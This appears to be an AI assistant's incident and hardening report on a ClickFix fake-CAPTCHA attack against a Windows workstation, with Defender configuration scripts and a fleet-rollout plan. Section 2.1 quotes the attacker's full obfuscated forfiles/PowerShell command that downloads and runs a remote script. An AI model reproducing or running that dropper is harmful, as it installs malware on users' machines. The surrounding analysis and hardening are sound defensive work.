# Endpoint Security Incident & Hardening Report

**Date:** 2026-07-10
**Device:** BLOKEY (Windows 11 Pro, build 10.0.26200)
**User:** razer (robertp@careindeed.com)
**Management:** Hexnode UEM (agent confirmed running)
**Prepared by:** Claude Code, at user request
**Status:** Evaluate on this device for 1 week → then deploy to fleet via Hexnode

---

## 1. Executive summary

On 2026-07-10 the user encountered a **ClickFix / fake-CAPTCHA social-engineering attack** — a malicious web page disguised as a Chrome prompt instructed the user to paste and run a command that would download and execute remote malware.

**Outcome: no compromise.** Full investigation found no persistence, no rogue processes, no malicious network activity, and no dropped payloads. The remote payload URL was already dead (HTTP 404). A Defender quick scan returned **no threats**.

Separately, this review found that the machine's existing Defender hardening (configured previously by the "Codex" tooling) is **intact and enforcing** — Windows Updates did not remove it — and identified four low-burden improvements plus an important false-positive issue affecting the team's own test automation.

---

## 2. The attack

### 2.1 What the user received
A web page (presented as a Chrome prompt) told the user to run this command:

```
forfiles /p C:\Windows\System32 /m notepad.exe /c "cmd /v:on /c set p=pow&set e=ershe&set l=ll&!p!!e!!l! -WI 1 -nop -c iex(irm cdn.jsdelivr.net/gh/Robiboart/workhome@eab010d/ff-7)"
```

### 2.2 Decoded intent (why it is malicious)
| Component | Purpose |
|---|---|
| `forfiles … /c "cmd …"` | Launches the payload via a trusted Windows binary (living-off-the-land, evades some tooling) |
| `set p=pow&set e=ershe&set l=ll&!p!!e!!l!` | Splits the word "powershell" into fragments to defeat string-based detection |
| `-WI 1` (WindowStyle Hidden) | Runs with no visible window |
| `-nop` (NoProfile) | Skips user profile to avoid logging/customizations |
| `iex(irm <url>)` | Downloads a remote script and executes it immediately, unseen |

**Indicators of compromise (IOCs):**
- URL: `cdn.jsdelivr.net/gh/Robiboart/workhome@eab010d/ff-7` (GitHub repo `Robiboart/workhome`, commit `eab010d`, file `ff-7`) — **returned HTTP 404 at time of review**
- Technique: ClickFix / fake CAPTCHA (MITRE ATT&CK T1204.004 – Malicious Copy-Paste; T1059.001 – PowerShell)

### 2.3 Key user-education point
**No legitimate website, Chrome, or Windows will ever ask you to paste a command into a terminal or the Run box.** That instruction, by itself, always indicates an attack.

---

## 3. Investigation & findings (no compromise)

| Check | Result |
|---|---|
| Payload URL reachability | **404 – gone.** If down when run, `iex` received nothing and installed nothing |
| Win+R Run history (RunMRU) | Empty — no trace of the command |
| PowerShell console history | Only normal dev commands |
| Persistence: Run / RunOnce keys | Clean — no malicious entries |
| Persistence: Startup folder | Clean (OneDrive, Authenticator, Ollama only) |
| Persistence: Scheduled Tasks | No new/non-Microsoft tasks |
| Persistence: WMI event consumers | None |
| Dropped files (Temp/AppData/Downloads, 48h) | Only legitimate project/tool artifacts |
| Running processes | No rogue PowerShell/mshta/rundll; the one hidden PowerShell is Claude Code's own sandbox |
| Outbound network connections | All belong to known apps (Chrome, Claude, Codex, language servers, Defender, audio/GPU) |
| Windows Defender real-time protection | ON |
| Defender quick scan (run during review) | **No threats found** |

**Conclusion:** This was a near-miss, not a breach.

---

## 4. Current security posture (baseline — as set by "Codex")

Captured 2026-07-10, before any changes:

| Setting | Value | Notes |
|---|---|---|
| Real-time protection | On | |
| Behavior monitoring | On | |
| Network Inspection (NIS) | On | |
| Cloud reporting (MAPS) | Advanced (2) | |
| PUA protection | **Audit (2)** | logs only, does not block |
| Network Protection | **Off (0)** | gap |
| Cloud block level | **Default (0)** | gap |
| Controlled Folder Access | Block (1) | on |
| Tamper Protection | Managed | |
| ASR rules | **5 enabled, all Block** | see below |

**ASR rules currently enforced (all Action = Block):**
1. `5BEB7EFE-FD9A-4556-801D-275E5FFC04CC` — Block execution of potentially obfuscated scripts
2. `d1e49aac-8f56-4280-b9ba-993a6d77406c` — Block process creation from PSExec & WMI
3. `9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2` — Block credential theft from LSASS
4. `b2b3f03d-6a65-4f7b-a9c7-1c7ef74a9ba4` — Block untrusted/unsigned processes from USB
5. `d4f940ab-401b-4efc-aadc-ad5f3c50688a` — Block Office apps creating child processes

---

## 5. Block history report (Defender Operational log, last 30 days)

### 5.1 ASR blocks — 114 events, all benign
Every ASR block was rule **"Block credential theft from LSASS"** firing against `C:\Windows\System32\svchost.exe`. This is legitimate Windows service activity and a well-documented noisy false-positive for this rule. **No external or malicious activity.**

### 5.2 Malware detections — 6 events, ALL FALSE POSITIVES
Defender logged `Trojan:Win32/ClickFix.DAD!MTB` (Severe) on 6/16 and 6/17. Inspection of the flagged command lines shows they are the **team's own Playwright UI-verification scripts** (`require('playwright')`, `localhost:5173`, `careindeed.com`, redesign screenshot runs). Defender's ClickFix heuristic matches the `powershell -NoProfile -Command … @'…'@` heredoc shape used by the test automation.

> **These are not malware.** The dev tooling trips the same signature family as the real attack. See remediation in §7.

### 5.3 Network Protection — no events
Because Network Protection is currently off (addressed in §6).

### 5.4 The 2026-07-10 ClickFix dropper
Does **not** appear in the detection log, consistent with it never executing.

---

## 6. Recommended hardening (strengthen only, low burden)

| Change | From | To | Rationale |
|---|---|---|---|
| Network Protection | Off | **Block** | Blocks connections to known-malicious domains/IPs at OS level. Would have stopped today's payload download and any C2. Highest value. |
| PUA Protection | Audit | **Block** | Actually block adware/bundled junk instead of only logging |
| Cloud Block Level | Default | **High** | More aggressive verdicts on unknown files |
| MAPS reporting | Advanced | Advanced | Confirm/keep |
| +5 ASR rules | 5 | **10** | Add no-friction rules (below) |

**ASR rules to add (all Block):**
| GUID | Rule |
|---|---|
| `e6db77e5-3df2-4cf1-b95a-636979351e5b` | Block persistence through WMI event subscription |
| `d3e037e1-3eb8-44c8-a917-57927947596d` | Block JS/VBScript from launching downloaded executables |
| `be9ba2d9-53ea-4cdc-84e5-9b1eeee46550` | Block executable content from email/webmail |
| `56a863a9-875e-4185-98a7-b882c64b5ce5` | Block abuse of vulnerable signed drivers |
| `c1db55ab-c21a-4637-bb3f-a12568109d35` | Advanced ransomware protection |

**Deliberately NOT recommended** (developer friction): `01443614-cd74-433a-b99e-2ecdc07bfc25` — "Block executable files unless they meet prevalence/age/trusted-list." This would block freshly built, unsigned binaries from npm/node builds.

### 6.1 Apply script (single machine — run in elevated PowerShell, idempotent)

```powershell
# --- Defender hardening: strengthen only, keeps existing config ---
Set-MpPreference -EnableNetworkProtection Enabled
Set-MpPreference -PUAProtection Enabled
Set-MpPreference -CloudBlockLevel High
Set-MpPreference -MAPSReporting Advanced

$want = @(
  'e6db77e5-3df2-4cf1-b95a-636979351e5b', # WMI persistence
  'd3e037e1-3eb8-44c8-a917-57927947596d', # JS/VBS launching downloaded exe
  'be9ba2d9-53ea-4cdc-84e5-9b1eeee46550', # exec content from email/webmail
  '56a863a9-875e-4185-98a7-b882c64b5ce5', # vulnerable signed drivers
  'c1db55ab-c21a-4637-bb3f-a12568109d35'  # advanced ransomware protection
)
$have = @((Get-MpPreference).AttackSurfaceReductionRules_Ids) | ForEach-Object { $_.ToLower() }
foreach ($id in $want) {
  if ($have -notcontains $id.ToLower()) {
    Add-MpPreference -AttackSurfaceReductionRules_Ids $id -AttackSurfaceReductionRules_Actions Enabled
  }
}
Write-Host "`nHardening applied. Current state:" -ForegroundColor Green
$m = Get-MpPreference
[pscustomobject]@{ NetworkProtection=$m.EnableNetworkProtection; PUA=$m.PUAProtection; CloudBlockLevel=$m.CloudBlockLevel; ASR_RuleCount=@($m.AttackSurfaceReductionRules_Ids).Count } | Format-List
```

### 6.2 Verify script (paste after applying)

```powershell
$m = Get-MpPreference
"NetworkProtection = $($m.EnableNetworkProtection)  (want 1)"
"PUAProtection     = $($m.PUAProtection)  (want 1)"
"CloudBlockLevel   = $($m.CloudBlockLevel)  (want 4=High)"
"ASR rule count    = $(@($m.AttackSurfaceReductionRules_Ids).Count)  (want 10)"
```

---

## 7. False-positive remediation (required before fleet deploy)

The team's Playwright/UI-verification scripts trigger the ClickFix heuristic and will be quarantined more aggressively once Cloud Block Level is High. Before fleet rollout, add a **path exclusion** for the test-automation directory.

> **Action needed from owner:** confirm the exact folder your Playwright verification scripts execute from (e.g. `...\tmp-ui-verify-screenshots\` and the script staging path). Then add:

```powershell
# Replace with the confirmed automation path(s)
Add-MpPreference -ExclusionPath "C:\AI\Git\training\HomeHealth\Policies_and_Procedures_V2\tmp-ui-verify-screenshots"
```

Prefer a **narrow folder exclusion** over a process exclusion for `powershell.exe` (excluding PowerShell itself would create a real security hole).

---

## 8. One-week evaluation plan (this device)

1. Apply §6.1 on BLOKEY.
2. Add the §7 exclusion once the automation path is confirmed.
3. During the week, monitor for friction and blocks:
   ```powershell
   Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Windows Defender/Operational'; Id=1121,1122,1125,1126,1116,1117; StartTime=(Get-Date).AddDays(-7)} |
     Select-Object TimeCreated, Id, @{n='Msg';e={$_.Message.Split("`n")[0]}} | Format-Table -AutoSize
   ```
4. Note any legitimate app/site blocked by Network Protection. If one occurs, temporarily set `-EnableNetworkProtection AuditMode` to confirm before excluding.
5. Record findings in §10 below.

---

## 9. Fleet deployment via Hexnode UEM

Three routes (see also team notes):

**Option A — Script (recommended for fidelity):** Deploy §6.1 as a Hexnode *Execute Custom Script* (PowerShell) policy, execution context **System** (runs elevated, no user prompt). Include the §7 exclusion. Idempotent — safe to re-run across the fleet.

**Option B — Native Defender policy:** Use Hexnode's Windows Defender/Endpoint Security template for the toggles (Network Protection, PUA, cloud level, CFA). Pair with Option C for full ASR coverage.

**Option C — Custom OMA-URI (granular ASR):**
- `./Vendor/MSFT/Policy/Config/Defender/AttackSurfaceReductionRules` (String) = all **10** GUIDs as `guid=1|guid=1|…`. **Put the full 10-rule list**, not just the 5 additions — once ASR is MDM-managed it becomes authoritative and merge behavior can drop locally-set rules.
- `./Vendor/MSFT/Policy/Config/Defender/EnableNetworkProtection` = `1`
- `./Vendor/MSFT/Policy/Config/Defender/PUAProtection` = `1`

> Note: **Cloud Block Level (High)** has no clean Policy-CSP node — set it via the script (Option A) or the native cloud-protection dropdown (Option B). This tips the recommendation toward Option A.

**Pre-deployment checklist:**
- [ ] §7 automation exclusion confirmed and included
- [ ] Full 10-rule ASR list used in MDM policy (not just deltas)
- [ ] Pilot ring (5–10 devices) before full fleet
- [ ] Document rollback (§11) in the Hexnode change record

---

## 10. Rollback

Any change here is reversible:
```powershell
# Soften a setting to audit-only instead of removing
Set-MpPreference -EnableNetworkProtection AuditMode
# Remove a specific added ASR rule
Remove-MpPreference -AttackSurfaceReductionRules_Ids <GUID>
# Turn PUA back to audit
Set-MpPreference -PUAProtection AuditMode
```
Via Hexnode: revert or unassign the policy; devices return to prior state at next sync.

---

## 11. Open items / owner actions
- [ ] Confirm Playwright/automation folder path(s) for the §7 exclusion.
- [ ] Run §6.1 on BLOKEY and begin the 1-week evaluation.
- [ ] Decide Hexnode route (recommend Option A + exclusion).
- [ ] Optional: report the two ClickFix domains/IOCs to your security contact / block at network egress.

*This report documents a single-device review. Fleet-wide state should be validated per device after policy deployment.*
